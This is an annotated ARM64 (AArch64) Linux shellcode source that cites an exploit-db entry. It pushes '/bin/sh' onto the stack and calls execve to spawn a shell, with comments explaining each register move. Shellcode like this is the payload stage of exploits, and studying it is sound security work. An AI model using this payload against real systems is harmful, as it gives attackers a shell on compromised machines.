// Ref: https://www.exploit-db.com/exploits/47048
.section .text
.global _start

// X0-X30 - General purpose registers (64 bits)
// W0-W30 -               ||          (32 bits)

_start:
    // syscall --> execve("/bin/sh", NULL, NULL)

    // hs/nib/
    mov     x1, #0x622F                             // x1 = 0x000000000000622F ("b/")
    movk    x1, #0x6E69, lsl #16                    // x1 = 0x000000006E69622F ("nib/")         ; Notice that we shift left by 16 bits so that we don't overlap bits.
    movk    x1, #0x732F, lsl #32                    // x1 = 0x0000732F6E69622F ("s/nib/")       ; Same principle as before but shift 32 bits
    movk    x1, #0x68, lsl #48                      // x1 = 0x0068732F6E69622F ("hs/nib/")
    str     x1, [sp, #-8]!                          // push x1 to stack (64 bits -> 8 bytes)

    mov     x1, xzr                                 // args[1] = NULL                           ; xzr (zero register)
    mov     x2, xzr                                 // args[2] = NULL
    add     x0, sp, x1                              // args[0] = pointer to "/bin/sh\0"

    mov     x8, #221                                // Systemcall Number = 221 (execve)         ; X8 is the indirect result register
    svc     #0x1337                                 // Invoke Systemcall
